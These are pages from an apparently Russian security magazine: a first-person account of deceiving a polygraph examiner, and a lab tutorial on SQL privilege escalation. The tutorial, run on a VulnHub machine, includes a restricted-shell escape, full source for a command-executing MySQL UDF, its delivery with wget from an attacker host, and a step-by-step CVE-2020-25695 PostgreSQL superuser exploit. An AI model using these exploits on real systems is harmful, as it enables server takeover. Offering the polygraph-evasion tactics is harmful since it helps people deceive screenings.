   Можно ли обмануть МРТ? Проще простого: положите в томограф другого
человека. Результаты будут иными, но врач, скорее всего, заметит подмену.
  С полиграфом точно так же: его обмануть несложно, хоть иголкой себя
тыкай на проверке, а вот можно ли обмануть полиграфолога — это уже
зависит от его профессионализма.
  К тому же, как и врач, ищущий рак, верификатор использует не только
полиграф, но и различные «безынструментальные» методы.


             INFO

                        Обман — всегда дуэль человека и человека, а не
                          человека и устройства.


Нужно иметь в виду, что в идеальном случае проверку записывают на видео,
в первую очередь чтобы свести к минимуму влияние субъективного фактора.
Фактически для кросс‑валидации: эту запись на скорости 0,5 затем прос‐
мотрит второй эксперт и напишет свой независимый отчет. Так что это про‐
тивостояние против двоих с явным их преимуществом!
  К  слову, в моем  кейсе верификатор кросс‑валидацию не проводил,
а работал один.


ЧТО ИЩЕТ ПОЛИГРАФОЛОГ?

В человеческом организме не существует физиологического отклика, уни‐
кального исключительно для обмана. Никакое действие, реакция, показатель
не могут однозначно свидетельствовать о том, что человек лжет.
   Полиграф работает сложнее: с его помощью полиграфолог ищет два кра‐
еугольных камня — стресс и значимость .
   Задача специалиста (полиграфолога или верификатора) — сопоставить
реакции испытуемого с конкретными стимулами. Выяснить, на что именно
реагирует человек, и попробовать определить почему.
   Стресс может быть базовой реакцией на само исследование, и одна
из главных задач полиграфолога — показать свою безопасность и успокоить
испытуемого. Ведь высокий уровень стресса по умолчанию — это «шум», зат‐
рудняющий работу специалиста.
   Значимость же может проявляться по разным причинам. Например, тема
алкоголизма может быть очень стрессовой и значимой просто потому, что
в семье испытуемого есть проблемы с этой пагубной привычкой у близкого
родственника. Выявить значимые темы, снизить базовый уровень стресса
и определить базовую «калибровочную» линию поведения — это ни одна
железка не сможет, с подобным справится только психолог.
  Но на что опирается эксперт в выводах? На систематические и повторя‐
ющиеся реакции, отклоняющиеся от базовой линии поведения. Человек
заметно начинает нервничать и показывать признаки сокрытия, искажения
информации при упоминании события. Хотя при разговоре на иные темы он
ведет себя иначе — в рамках своей базовой линии.
   Вот наглядный пример из области веб‑пентеста: результаты blind-инъ‐
екций мы не видим, но видим повторяющуюся нестандартную реакцию
на нашу полезную нагрузку. И если при первой проверке мы не совсем
понимаем, чем вызван изменившийся ответ приложения либо даже задержка
с ответом в случае time-based-атак, то через несколько повторений и попыток
предъявить тот же пейлоад немного иначе мы начинаем осознавать, в чем же
кроется уязвимость и какая реакция происходит в этом «черном ящике».
   Человек — та же самая «черная коробка», но вместо пейлоадов — воп‐
росы (стимулы), а вместо ответов сервера — реакции и набор параметров,
фиксируемых полиграфом.
   Как и в приложении, начинающем вести себя нестандартно, мы ищем
отклонения от базовой линии поведения. Но ведь чтобы найти отклонение,
сначала нужно определить базовую линию поведения, а как?


АРХИТЕКТУРА ПРАВИЛЬНОЙ ПРОВЕРКИ

Профессиональная проверка — это не просто «посидеть на стуле» и прой‐
тись по тестам. Это структурированный процесс, где каждый этап имеет кри‐
тическое значение.
 1. Знакомство (около 30 мин) — этап установления контакта с испытуемым.
   Первая задача этого этапа — снять фоновую тревожность, чтобы выделить
   полезный сигнал из шума. Вторая задача — определить противопоказания
   к проверке, о них мы поговорим далее.
 2. Предтестовая беседа (от 1 до 3 ч). Это самый важный этап, хотя датчики
  еще не подключены и полиграфолог ведет с испытуемым с виду обычный
   диалог. Но именно в этот момент верификатор «калибрует» испытуемого,
   изучает его базовые реакции, определяет свою линию поведения и ищет
   значимые темы. Именно по этим темам  будут  задаваться  вопросы
   на самом  полиграфе.  «Безынструментальные» методы уже  начинают
   работать, и после предтестовой беседы можно сделать первые выводы.
 3. Полиграфное тестирование (от 1 до 2 ч) — проход по тестам с ответами
   «Да/нет», запись реакций на вопросы. Каждый вопрос, как правило,
   предъявляется несколько раз, в контрольной и проверочной формах,
   в различных формулировках — для определения устойчивых и повторя‐
  емых реакций. При необходимости тесты модифицируют, уточняют и про‐
   цедуру повторяют.
 4. Завершение / выведение на признание (до 1 ч) — завершение про‐
   цедуры либо, в случае полной уверенности верификатора, попытка «про‐
   давить» признания с помощью психологических манипуляций — указывая
   в первую очередь на то, что лжец разоблачен.

Обрати внимание, что основная работа происходит без датчиков, на втором,
самом важном этапе проверки. Именно на нем чаще всего может провалить‐
ся как испытуемый, так и недостаточно профессиональный полиграфолог.
  С самого начала моего участия в Red Team я собирался максимально про‐
тиводействовать полиграфисту на первых двух этапах.


ЗАДАЧИ МОЕГО RED-TEAM-ПРОЕКТА

В моем проекте задачи были поставлены предельно простые:
 • Проверить  качество  проведения  полиграфной  проверки,  а  именно
   выявить маркеры непрофессионала.
 • Скрыть факт проведения этой проверки.
 • Скрыть чувствительные для любого пентестера темы:
    • Случайное или неумышленное разглашение данных заказчика. Пример:
     «А мог ли я это говорить на конференции?»
    • Неумышленное нанесение ущерба заказчику. Пример: «Я на пентесте
       случайно положил прод банка на 45 минут!»
 • Создать «идеально чистый» образ испытуемого, получить от верификато‐
   ра минимальный отчет.

В результате ошибок моего оппонента и его низкого профессионализма все
цели были успешно выполнены. Проверка заняла меньше всего времени
из всех кандидатов, отчет также получился минимальным и идеально чистым.
  Мой же отчет о работе оппонента был максимально изобличительным.


БЕЗЫНСТРУМЕНТАЛЬНЫЕ МЕТОДЫ

Изменения в базовой линии поведения можно заметить и без полиграфа.
Это основной навык верификатора, который зачастую и служит фундаментом
его профессионализма. Он же залог успеха хорошей предтестовой беседы!
  На что именно обращает внимание профессиональный верификатор?
 • Сигналы  вегетативной  нервной  системы , говорящие о повышении
   уровня  стресса.  Например,  опытный  следователь  всегда  поставит
   перед тобой стакан воды, ведь при стрессе у всех пересыхает во рту
   и очень хочется пить. Туда же относятся и испарины, покраснения лица
   от притока крови и подобное.
 • Изменения голоса: «пациент» начал говорить тише или громче, голос
   стал тоньше.
 • Что именно испытуемый говорит: часто мы сами не замечаем, как ого‐
   вариваемся или проговариваемся. Мы уклоняемся от ответов на «опас‐
   ные» вопросы, начинаем говорить односложно или, наоборот, «забал‐
   тывать» собеседника. Используем обобщения, противоречим самому
   себе, путаем детали.
 • Жесты, эмблемы и адаптеры — если упрощать, то это язык тела: пов‐
   торяющиеся действия для «самоуспокоения» тоже могут быть сигналом
   стресса или значимости темы.
 • Несоответствие слов и микровыражений, эмоций. Эмоции часто отоб‐
   ражаются на лице в виде быстрой мимики — микровыражений. Например,
   эмоция отвращения, когда мы говорим о неприятном нам человеке, корот‐
   кое  удивление, сменяемое  страхом,  когда  несправедливо  обвиняют
   в преступлении. Несоответствие слов и эмоций — важный маркер.

Для всего этого не нужен полиграф, только наметанный глаз верификатора,
это база предтестовой беседы. Но перед этим верификатор должен про‐
верить ограничения. Какие же они?


ОГРАНИЧЕНИЯ

Цель исследования — всегда выявление фактов, а не ощущений, домыслов
или мнений.
 • Крал ли ты деньги?
 • Известно ли тебе, кто совершил это действие?
 • Где ты был в прошлый вторник в 20:00?
 • Встречался ли ты с кем‑то, кто работает или связан с компанией конкурен‐
   та?

Это факты.
 • Мог бы ты совершить кражу?
 • Относишься ли ты лояльно к компании?
 • Негативно ли ты настроен к политике информационной безопасности
   в компании?

Это ощущения, домыслы и не предмет исследования.
  Для проведения исследования испытуемый должен быть:
 • вменяем,  без  психиатрических  заболеваний,  мешающих  осознавать
   реальность;
 • не под действием седативных или иных препаратов, влияющих на соз‐
   нание и психику;
 • в нормальном состоянии здоровья, без болевых ощущений, недосыпа.

Также важно, что испытуемый не должен сам быть верификатором, иначе вся
проверка превращается в дуэль.
  В ходе моего Red-Team-проекта я старательно подготовился к испытанию:
не спал больше тридцати часов и был измотан длительным авиаперелетом.


МАРКЕРЫ НЕПРОФЕССИОНАЛА

Базовые ошибки непрофессиональных верификаторов зачастую типичны:
 • Нарушение ограничений: не уточняют, не обращают внимания на сос‐
   тояние здоровья, вменяемость или прием препаратов. В моем случае
   верификатор мое состояние не заметил, мне же это было на руку: все
   реакции были «зашумлены», что упрощало мне задачу. К тому же верифи‐
   катор даже не спросил, не верификатор ли я.
 • Дешевые трюки: приемы, призванные «впечатлить» испытуемого. Чаще
   всего предлагают «показать, как работает полиграф», подключают датчики
   и просят умышленно соврать, например неправильно назвать свое имя.
   После чего горе‑верификатор самостоятельно подтасовывает результаты,
   например незаметно поднимает график мышкой и демонстрирует испы‐
   туемому, утверждая, что он «все видит». Именно так и поступил мой оппо‐
   нент‑верификатор, и самым сложным в этот момент было сдержать улыб‐
    ку.
 • Агрессия и давление. Худшее, что может делать непрофессионал. Чаще
   всего этим грешат выходцы из силовых ведомств. Фактически подобный
   подход ведет к смазыванию результатов, повышению уровня шума и про‐
   тиводействию вне зависимости от причастности. Это абсолютно деструк‐
   тивное в рамках проверки поведение и главный маркер непрофессионала.
  В моем проекте именно этого маркера было хоть отбавляй, не хватало
  лишь настольной лампы, направленной мне прямо в лицо. Но и причины
   подобного были очевидны: стену за моим оппонентом украшало множес‐
   тво дипломов от силовых  структур, видимо, он искренне верил, что
   это впечатлит испытуемого. К слову, именно агрессия и давление стали
   причиной старта моего проекта, многие предыдущие испытуемые букваль‐
   но сбегали с проверки в истерике. Моя цель была в том, чтобы зафик‐
   сировать подобное поведение.
 • Выход за рамки: вопросы о религии, сексуальной ориентации или других
   темах, не касающихся дела. Попытки влезть в личную жизнь испытуемого,
   как  правило, вызывают ответную реакцию, как и в  случае агрессии
   или  давления. Этим  также грешил проверяемый мной верификатор.
  О причинах подобного поведения и непрофессионализма судить сложно.
 • Невнимательность: игнорирование уверток, умышленных уточнений, ого‐
   ворок, попыток ответить «не на тот вопрос» или вовсе уходов от темы воп‐
   роса. Все эти трюки используются для снижения значимости, уровня
   стресса и увода от «опасных» тем. Профессиональный верификатор дол‐
  жен замечать и мягко пресекать подобное поведение, мой же оппонент
   ничего не заподозрил.


ПРОТИВОДЕЙСТВИЕ ДЕТЕКТОРУ ЛЖИ

Главное — забудь все вредные советы из фильмов. Канцелярская кнопка
в ботинке, попытки щипать себя и симулировать реакции — лучший способ
показать, что ты что‑то скрываешь.


Не работает
 • Кнопка в  ботинке или  укусы щеки: боль вызывает предсказуемый
   всплеск, который опытный глаз отличит от реакции на ложь. Более того,
   это маркер, что ты причастен к рассматриваемому инциденту и намерен
   противодействовать проверке.
 • Контроль дыхания: искусственные паттерны дыхания выглядят на графике
   как явная аномалия. К тому же ты не сможешь постоянно контролировать
   дыхание, если ты не профессиональный пловец или певец, и изменения
   будут еще более заметны.
 • Отказ от проверки: в большинстве случаев это равносильно признанию
   вины и провалу.


Работает
 • Абьюз ограничений: состояние здоровья или прием разрешенных пре‐
   паратов, влияющих на ЦНС, создают более зашумленную картину. Такое
  же влияние на результат оказывают сильный недосып и усталость, что я
   и использовал.
 • Генерация  «шума»:  умышленное  создание  эмоциональных  реакций
   на нейтральные вопросы. В нашей жизни всегда есть ситуации, которые
   заставляют нас тревожиться или нервничать. Если крутить у себя в голове
   подобные стрессовые мысли при нейтральных вопросах, это также собьет
   верификатора с толку и помешает определить базовую линию поведения.
   Буквально ты можешь себя правильно «накрутить».
 • Переопределение смыслов: если ты искренне считаешь, что «взять кан‐
   целярию домой — это не кража», то и стресса в ответ на вопрос, не ты ли
   спер с директорского стола степлер, не будет. Ты можешь переопре‐
   делять многие действия, пуститься в объяснения и рассуждения во время
   предтестовой беседы, подменяя смыслы и иным образом стараясь сни‐
   зить значимость опасных для тебя тем.
 • Увод в сторону: ответы, которые формально правдивы, но не соответс‐
   твуют сути вопроса. Можно отвечать не совсем на те вопросы, которые
   тебе задали, а на их более комфортную версию.

Именно эти методы я и использовал на первых двух этапах. В результате
на третий этап с подключенным полиграфом были выбраны совершенно
безобидные для меня темы. И ответить на все вопросы абсолютно честно
не составило ни малейшего труда.


ВЫВОДЫ

Проверка на полиграфе не может служить доказательством в суде. Очевидно,
что даже наличия двух независимых заключений от двух верификаторов
недостаточно, чтобы считать детектор лжи доказательством. И это хорошо.
Но при этом суды принимают во внимание показания свидетелей, которые
зачастую в разы субъективнее и эмоциональнее.
  К тому же существует еще один возможный финальный этап — «выведение
на признание». Факты, рассказанные испытуемым во время этого этапа,
зачастую и позволяют получить те доказательства, которые лягут в основу
уголовного дела.
   Верификация — это всегда дуэль двух интеллектов. «Серебряной пули»,
позволяющей обмануть полиграфолога, не существует, так как главным сла‐
бым местом остается субъективная значимость вопроса для испытуемого.
Чем значимее для тебя прохождение самой проверки, чем профессиональ‐
нее твой оппонент‑верификатор, тем выше уровень сложности.
   Одно дело, когда ты скрываешь свои небольшие проблемы на прошлых
местах работы, и совсем другое, если тебе грозит серьезное наказание, —
в этом случае держать себя под контролем намного сложнее. © X
ВЗЛОМ





Добрался до базы данных и не знаешь,
как раскрутить вектор до захвата сервера?
В этой статье на пальцах разберем при‐
меры  получения  рута  сначала  в  базе,              ret0x2A
                                                                                            @ret0x2A
а затем и на сервере.


SQL Privilege Escalation бывает двух типов: повышение привилегий внутри
базы  данных  и  повышение   привилегий  в  операционной  системе.
При повышении привилегий в ОС важно, чтобы база данных была запущена
от имени привилегированного пользователя. Как минимум это должен быть
другой пользователь, чтобы можно было поискать другие векторы для эска‐
лации.


             INFO

                     Для краткости в статье вольно использую термин
                        «база данных» по отношению к MySQL и прочим
                         системам  управления базами  данных  (СУБД).
                      База  данных —  это набор  таблиц,  индексов
                      и подобного. Система управления базами дан‐
                      ных — программное обеспечение, которое пре‐
                             доставляет возможность  создания баз  данных
                      и доступа к ним.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ОТ MYSQL ДО ROOT НА СЕРВЕРЕ

Для демонстрации уязвимости будем использовать лабораторную работу
с VulnHub под названием Kioptrix: Level 1.3 . Скачай ее, если собираешься пов‐
торять все упражнения из статьи. Рекомендую: так ты гораздо лучше поймешь
изложенное, плюс у тебя будет возможность поэкспериментировать самос‐
тоятельно.
  Для запуска в VirtualBox бери версию VMware. В архиве лежит файл
Kioptrix4_vmware.vmdk , VirtualBox понимает этот формат. Создай новую
машину, задай название, выбери тип Linux и укажи ОС Ubuntu. Образ ISO
выбирать не нужно. В настройках жесткого диска выбери «Использовать
существующий». Нажми кнопку выбора диска, добавь новый носитель, указав
путь к Kioptrix4_vmware.vmdk . Машина готова к старту.
  Я не буду описывать путь получения логина и пароля. Если интересно, поп‐
робуй пройти этот путь полностью — начиная со сканирования портов и до
момента получения кред.
  Для аутентичности атаки подключись по SSH. Или, как я, используй тер‐
минал запущенной машины. Разницы никакой нет: все команды и реакция
на них одинаковые.
   Залогинься с учетными данными john/MyNameIsJohn. Машина выдаст
приветствие, но это ограниченная оболочка lshell. Limited Shell фильтрует
команды пользователя, оставляя только самое необходимое. Например, ls ,
cd , echo . Если попытаешься выполнить mysql , получишь сообщение о неиз‐
вестной команде. Чтобы загрузить привычный bash, выполни


echo os.system('/bin/bash')

Оболочка написана на Python, поэтому echo пробросит интерпретатору os.
system() . Функция system() из стандартного пакета os выполнит системный
вызов. Теперь у тебя есть полноценный шелл.





                       Запуск mysql за пределами lshell

Попробуй запустить mysql от рута: mysql -u root . На тестовой машине
для пользователя root базы данных пароль не установлен. Современные
версии MySQL всеми способами защищают от входа под root с пустым
паролем, но среди айтишников много талантливых ребят, которые не приз‐
нают пароль для root .
   Чекни пользовательские функции:


select * from mysql.func;

Пользовательские функции — это способ расширить возможности MySQL.
Код пишут на системном языке программирования, вроде C или C++. Его ком‐
пилируют в обычные библиотеки: .so для Linux или .dll для Windows. Биб‐
лиотеку помещают в папку плагинов MySQL, после чего функцию можно
добавить как UDF (user-defined function). UDF нужны, например, при обработ‐
ке сложных структур данных и реализации собственных алгоритмов, а еще
когда нужны системные вызов и прочие вещи, которые не поддерживает
MySQL.





                            Результат проверки функций

В   выводе   есть   интересная   функция   sys_exec   из   библиотеки
lib_mysqludf_sys.so . Скорее всего, такая функция выполняет системные
вызовы, а название библиотеки lib_mysqludf_sys.so довольно популярно
в среде хакинга, исходный код может быть подобен этому коду на GitHub .
  Но жесткого регламента по названиям нет. В учебной машине функция
и либа так названы для удобства и простоты. В реальности название может
не отображать назначение. Ситуацию осложняет то, что по выводу тоже
не всегда понятно назначение. Попробуй


select sys_exec("id");

В результате будет NULL , а не ожидаемый вывод id . Напрямую функция
не раскрывает информацию, но остается косвенный вариант — некорректный
вызов:


select sys_exec("brbrbr");

MySQL отвалится с ошибкой. Значит, есть хороший шанс, что UDF действи‐
тельно выполняет системные вызовы, но при этом не обрабатывает ошибки.
Попробуй добавить пользователя john в группу администраторов:


select sys_exec(“usermod -aG admin john”);


           WARNING

                   В примере я добавил  пользователя в  группу
                   admin ,  это   особенность   конкретной  лабы.
                   В большинстве случаев добавлять нужно в группу
                   sudo .


Ответ NULL дает надежду, что все прошло успешно. Выйди из MySQL в обо‐
лочку и выполни sudo su . Бинго! Ты добился эскалации привилегий через
MySQL.





      Эскалация привилегий через пользовательскую функцию MySQL


Загрузка UDF на сервер
Использовать буду ту же машину — Kioptrix: Level 1.3.
   Тестовая машина полностью под нашим контролем, поэтому на ней удоб‐
но показать сам процесс. На практике, чтобы загрузить библиотеку UDF, тебе
нужно проверить, есть ли для этого условия. Первым делом посмотри версию
MySQL:


select version();

Версия подскажет хотя бы косвенно, с какими ограничениями можешь стол‐
кнуться. Чем новее база, тем больше сложностей. Какие тебе будут попадать‐
ся версии, зависит от типа таргетов. Работая с веб‑сайтами, чаще всего уви‐
дишь MySQL 5.7 и ее вариации. Иногда можешь встретить версии старее.
В корпоративных сетях старички бывают редко — разве что там, где исто‐
рически работает какой‑то сервис и его до сих пор не переписали.
  На тестовой машине стоит версия 5.0.51a, в этой версии библиотеки раз‐
мещаются в /usr/lib. В более  свежих  версиях  путь  к  папке  смотри
в переменной @@plugin_dir:


select @@plugin_dir;
-- или
show variables like 'plugin%';

Имеет смысл посмотреть, что за пользователь и какими правами он обла‐
дает. Если придется загружать либу через INSERT, без соответствующих прав
не обойтись. Важно состояние права FILE : если ты не можешь писать в файл,
нужно искать другой вектор для загрузки либы.


select user();
select current_user();
show grants;
select * from information_schema.user_privileges where grantee like
concat('%', current_user(), '%');

Проверь состояние secure_file_priv :


show variables like "secure_file_priv";





                        Права на работу с файлами

Идеально, когда secure_file_priv равна пустой строке, — это значит, что
у тебя нет никаких ограничений. Если значение — NULL , все плохо: ты
не можешь записать файл никуда. Третий вариант — указана какая‑то кон‐
кретная папка для записи. В таком случае ты можешь писать только в эту пап‐
ку. Скорее всего, путь не указывает на папку с плагинами, а значит, загрузить
либу не получится.
   Если прав достаточно, попробуй записать данные в файл:


SELECT `sometext` INTO OUTFILE '/usr/lib/testfile.txt';
-- Альтернатива через DUMPFILE
SELECT `sometext` INTO DUMPFILE '/usr/lib/testfile.txt';

Если не возникло ошибок, скорее всего, файл создан и текст в нем. Убедить‐
ся в этом можешь с помощью LOAD_FILE() :


SELECT LOAD_FILE('/usr/lib/testfile.txt');





                               Запись в файл

Условия соблюдены, теперь выберем, что загружать. Пользовательские фун‐
кции  грузятся через  обычные  библиотеки:  в  Linux  это  бинарник .so ,
в Windows — привычные .dll. Есть готовые решения:
 • исходники либы на Exploit-DB;
 • штатная либа sqlmap;
 • своя либа есть и у Metasploit Framework — как обычно, со всеми наворо‐
   тами фреймворка;
 • большое количество вариантов лежит на GitHub.

Чтобы у тебя было понимание, как выглядит исходник, вот минимальный вари‐
ант, написанный на C :


#ifdef _WIN32
    #define DLLEXP __declspec(dllexport)
#else
    #define DLLEXP
#endif


#include <stdlib.h>
#include <string.h>
#include <mysql.h>


DLLEXP my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *
message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec() requires exactly one string
argument (the command)");
        return 1;
    }


    if (args->maybe_null[0]) {
        strcpy(message, "sys_exec() does not accept NULL argument");
        return 1;
    }


    initid->maybe_null = 0;
    return 0;
}


DLLEXP void sys_exec_deinit(UDF_INIT *initid) {
    // В нашем случае функция нужна только как заглушка
}


DLLEXP long long sys_exec(UDF_INIT *initid, UDF_ARGS *args,
                          char *is_null, char *error) {
    // args->args[0] — указатель на строку, необязательно
null-terminated!
    // system() ожидает null-terminated-строку → копируем с учетом
длины
    if (args->args[0] == NULL) {
        *error = 1;
        return -1;
    }


    unsigned long len = args->lengths[0];
    char *cmd = (char *)malloc(len + 1);
    if (cmd == NULL) {
        *error = 1;
        return -1;
    }


    memcpy(cmd, args->args[0], len);
    cmd[len] = '\0';


    int ret = system(cmd);
    free(cmd);


    return (long long)ret;
}

Как видишь, никаких секретов в коде нет. Либа экспортирует три функции:
 • sys_exec — основная функция, которая принимает отправленную коман‐
   ду и выполняет ее в системе;
 • sys_exec_init — функция инициализации, которая проверяет коррек‐
   тность аргументов и сообщает серверу о свойствах функции. Сервер
   передает полученную информацию, в том числе ошибки, пользователю;
 • sys_exec_deinit — функция, обратная инициализации, нужна для кор‐
    ректного завершения работы.

Обязательно импортируй mysql.h : в коде используются определенные в нем
типы данных — UDF_INIT и UDF_ARGS .
   Сборка .so для Linux:


gcc -o sys_exec.so -shared -fPIC sys_exec.c $(mysql_config --cflags
--libs)

Моя тестовая машина и Kali работают в VirtualBox с режимом сети «Сетевой
мост». Они прекрасно видят друг друга. Для доставки в папке с готовой либой
запускаю


python3 -m http.server 7777

На тестовой машине:


wget http://192.168.0.158:7777/sys_exec.so

Захожу в MySQL и выполняю


SELECT LOAD_FILE('/home/john/sys_exec.so') INTO DUMPFILE '/usr/lib/
sys_exec.so'

Погоди, а почему не загрузить файл сразу в нужную папку? Это демонстра‐
ция. Например, если у твоего таргета крутится Windows, есть шанс перекинуть
файл по SMB. Тогда команда загрузки могла бы выглядеть так:


LOAD_FILE('\\\\192.168.0.158\\sys_exec.so')

Или, например, ты можешь загрузить файл в папку upload сайта, а с базой
общаться через SQL-инъекцию. Два вектора, которые дополняют друг друга
и помогают тебе загрузить либу без проблем.
   Либа лежит в папке, осталось создать пользовательскую функцию:


CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'sys_exec.so';




                           Упс... ошибся с разрядностью

Как видно на скрине, ошибочка вышла. Поспешил — не проверил версию
системы и скомпилировал 64-битный файл. В итоге — wrong ELF class:
ELFCLASS64 . Перекомпилирую и доставлю снова.


gcc -m32 -shared -fPIC -o sys_exec.so sys_exec.c -I/usr/include/mysql

Если при компиляции появляются ошибки, включи поддержку 32-битной архи‐
тектуры и установи недостающие библиотеки:


sudo dpkg --add-architecture i386
sudo apt update
sudo apt install gcc-multilib g++-multilib libmariadb-dev:i386

Удали с тестовой машины либы и загрузи новые. Повтори создание функции
в MySQL. В ответе должно быть OK . Для теста создай файл:


SELECT sys_exec('touch /tmp/pwn');





                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
       SQL PRIVILEGE
          ESCALATION
              РАЗБИРАЕМ ЭСКАЛАЦИЮ
       ПРИВИЛЕГИЙ ЧЕРЕЗ БАЗУ ДАННЫХ




Когда нет возможности залить файл на сервер, существуют альтернативные
способы доставки. Например, закодировать .so -файл в Base64 или Hex.
В SQL тогда используешь функцию декодирования:


SELECT FROM_BASE64(
'f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAAAAAADQAAABINQAAAAAAADQAIAAJACgAGwAa
AAEAAAAA
AAAAAAAAAAAAAAC8AwAAvAMAAAQAAAAAEA...=') INTO OUTFILE '<
path-to-plugindir>/sys_exec.so'

Значение в Base64 или Hex будет большим, скорее всего, придется восполь‐
зоваться промежуточной таблицей и разбить либу на части:


# На Kali конвертируем .so в Hex
xxd -p sys_exec.so | tr -d '\n' > sys_exec.hex
# Разбиваем на части по 10 000 символов
split -b 10000 sys_exec.hex part_

В MySQL создай временную таблицу, помести в нее значения. Потом сделай
дамп в файл:


CREATE TEMPORARY TABLE hex_parts (part TEXT);


INSERT INTO hex_parts VALUES ('7F454C4602...');
INSERT INTO hex_parts VALUES ('...вторая часть...');
INSERT INTO hex_parts VALUES ('...третья часть...');


SELECT UNHEX(GROUP_CONCAT(part SEPARATOR ''))
INTO DUMPFILE '/usr/lib/sys_exec.so'
FROM hex_parts;


ПОВЫШАЕМ ПРИВИЛЕГИИ В БАЗЕ

Повышение привилегий внутри базы данных может привести к раскрытию
ранее недоступной информации. Например, можно увидеть базу с учетными
данными пользователей или получить возможность писать на диск, чтобы
закинуть шелл или библиотеку UDF.
   Современные базы неплохо защищены от эскалации привилегий. Если
наткнешься на какую‑нибудь древнюю MySQL, может сработать простой
UPDATE mysql.user . В остальном универсальных рецептов не будет. Неваж‐
но, как ты получил доступ к базе: через клиент или SQL-инъекцию, всегда
смотри версию и гугли в направлении известных CVE. Узнать версию можешь
подобными командами:


MySQL, Microsoft SQL Server:
SELECT @@version


PostgreSQL:
SELECT version()


Oracle:
SELECT banner FROM v$version
SELECT version FROM v$instance

Хороший пример для обучения — CVE-2020-25695 в PostgreSQL. Атакующий
от имени обычного пользователя создает функцию, которая выполнит ALTER
USER <username> SUPERUSER; и назначит нужного пользователя админом.
Функция прикручивается через триггер, который срабатывает отложенно.
После этого атакующий провоцирует систему выполнить триггер. Из‑за проб‐
лемы в архитектуре триггер выполняется с правами системы, и инъекция сра‐
батывает. Понять проще на практике.
  Для теста запусти уязвимую версию PostgreSQL 12.4 в Docker:


docker run --name cve2020-25695-pg `
  -e POSTGRES_PASSWORD=postgres `
  -p 5433:5432 `
  -v data:/var/lib/postgresql/data `
  -d postgres:12.4-alpine

Подключись как админ:


docker exec -it cve2020-25695-pg psql -U postgres

Создай пользователя и назначь его владельцем базы test :


CREATE USER testuser WITH PASSWORD 'testuser';
CREATE DATABASE testbase OWNER testuser;

Пользователь, от имени которого выполняешь атаку, должен быть владель‐
цем базы, чтобы была возможность создать индекс и триггер. Это обычная
практика — добавить для  отдельной базы  собственного  пользователя
и работать от его имени.





                    Создание пользователя для атаки

Выйди командой \q . Подключись как testuser :


docker exec -it cve2020-25695-pg psql -U testuser -d testbase

Создай три таблицы:


CREATE TABLE t0 (s varchar);
CREATE TABLE t1 (s varchar);
CREATE TABLE trig (a int, b int);

Таблица t0 нужна для прикрепления отложенного триггера. Таблица t1 —
для имитации работы безопасной функции и наглядности. По ней можешь
отследить, от чьего имени вызывался триггер. Таблица trig — это «спус‐
ковой крючок», который запустит всю схему. Вставка или удаление значений
в таблицу trig запустит процесс атаки.





                       Создание таблиц для атаки

Создай безопасную функцию, которая возвращает переданное ей значение.
Для атаки важно, чтобы функция не делала никаких изменений в данных, воз‐
вращала один и тот же результат для одного и того же входного значения.
Такие функции называются IMMUTABLE:


CREATE FUNCTION sfunc(integer) RETURNS integer LANGUAGE sql IMMUTABLE
AS 'SELECT $1';

Создай индекс для таблицы, который использует нашу функцию sfunc :


CREATE INDEX indy ON trig (sfunc(a));

Индекс обязывает PostgreSQL выполнять сервисные функции на основе
изменений данных в таблице trig . Все INSERT/ DELETE/ UPDATE учитываются
PostgreSQL и используются, например, при очистке таблицы.
   PostgreSQL не удаляет данные сразу, а помечает их как удаленные. Когда
таких записей становится много, PostgreSQL запускает функцию VACUUM,
которая физически удаляет данные. Поэтому важно, чтобы функция была
IMMUTABLE, иначе начнется бардак — во время очистки вдруг добавятся
новые записи или произойдут еще какие‑то изменения.
   Индекс ссылается на функцию по ее идентификатору OID, а не копирует ее
код. Значит, есть возможность подменить функцию на другую, которая будет
не IMMUTABLE, а VOLATILE . VOLATILE означает, что у функции есть побочные
эффекты. Например, в нашей обновленной функции есть INSERT.
   Чтобы подменить функцию, выполни


CREATE OR REPLACE FUNCTION sfunc(integer) RETURNS integer LANGUAGE
sql SECURITY INVOKER AS 'INSERT INTO t0 VALUES (current_user);
SELECT $1';

Посмотреть, что происходит с sfunc до и после подмены, можешь командой

SELECT  oid,  proname,  provolatile,  prosrc  FROM  pg_proc  WHERE
proname = 'sfunc'; .
  На скриншоте видно, что идентификатор и названия остались теми же,
а исходный код и тип функции поменялись.





                      Создали и подменили функцию

Обрати внимание, что ты не выполняешь в этой функции эскалацию привиле‐
гий. Если попытаться сделать это сейчас, PostgreSQL заметит атаку и выкинет
ошибку. Механизм атаки построен на нескольких разных триггерах, и добав‐
ление значения в t0 запустит следующий этап.
   Создай атакующую функцию:


CREATE OR REPLACE FUNCTION snfunc2(integer) RETURNS integer LANGUAGE
sql SECURITY INVOKER AS 'INSERT INTO t1 VALUES (current_user); ALTER
USER testuser SUPERUSER; SELECT $1';

Твоя задача — избежать ошибочных попыток ALTER USER . Создай третью
функцию, которая проверит, от чьего имени выполнен запуск. Если это сис‐
темный вызов от postgres , то передаем управление вредоносной snfunc2 :


CREATE OR REPLACE FUNCTION strig() RETURNS trigger AS $$
BEGIN
    IF current_user = 'postgres' THEN
        PERFORM snfunc2(1000);
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;


             INFO

                           Конструкция $$ <some-code> $$ LANGUAGE
                   plpgsql говорит PostgreSQL, что это тело фун‐
                         кции, и сообщает, на каком диалекте написана
                          функция. Все, что внутри $$  ..  $$ , можно
                        писать «как есть», без экранирования.


Цепочка почти готова, осталось добавить автоматический вызов функции
strig() по триггеру. Ключевая особенность уязвимости — триггер должен
сработать в конце транзакции ( COMMIT). Из‑за ошибки в архитектуре отложен‐
ное срабатывание приведет к запуску в контексте системной операции. Сис‐
темные операции выполняются от имени postgres и имеют максимальные
привилегии, а значит, можно выполнять любые команды:


CREATE CONSTRAINT TRIGGER def
AFTER INSERT ON t0
INITIALLY DEFERRED FOR EACH ROW
EXECUTE PROCEDURE strig();

